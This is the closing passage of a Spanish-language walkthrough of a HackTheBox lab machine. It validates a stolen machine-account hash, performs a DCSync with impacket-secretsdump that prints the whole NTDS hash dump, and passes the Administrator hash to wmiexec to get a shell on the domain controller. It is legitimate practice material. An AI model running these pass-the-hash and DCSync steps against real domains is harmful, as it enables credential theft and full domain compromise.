+Vemos que nos devuelve las credenciales de la cuenta creada `DC$`, si las comprobamos por crackmapexec vemos que son válidas, y que no hace falta autenticarse por Kerberos para comprobarlo.
+
+```bash
+❯ cme smb 10.129.142.54 -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577
+SMB         10.129.142.54   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.142.54   445    DC               [+] absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577 
+```
+{: .nolineno }
+
+Ahora podemos realizar un DCSync para obtener el NTDS, ya que en esta nueva cuenta su podemos usar NTLM como método de autenticación, por lo que el `Pass-the-hash` funciona.
+
+```bash
+❯ impacket-secretsdump 'absolute.htb/DC$@10.129.142.54' -hashes :A7864AB463177ACB9AEC553F18F42577
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
+J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
+M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
+D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
+s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
+j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
+n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
+m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
+l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
+c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
+s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
+d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
+svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
+svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
+winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
+............
+............
+```
+{: .nolineno }
+
+Con `wmiexec` nos conectamos al DC, usando el hash del usuario `administrator`.
+
+```bash
+❯ impacket-wmiexec 'absolute.htb/administrator@10.129.142.54' -hashes :1f4a6093623653f6488d5aa24c75f2ea
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+absolute\administrator
+
+C:\>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 3:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::1f6
+   IPv6 Address. . . . . . . . . . . : dead:beef::9126:7509:a487:d66e
+   Link-local IPv6 Address . . . . . : fe80::9126:7509:a487:d66e%11
+   IPv4 Address. . . . . . . . . . . : 10.129.142.54
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
+                                       10.129.0.1
+
+------
+C:\users\Administrator\desktop>type root.txt
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+C:\users\Administrator\desktop>
+```
+{: .nolineno }
+
+De esta manera habríamos concluido la máquina.
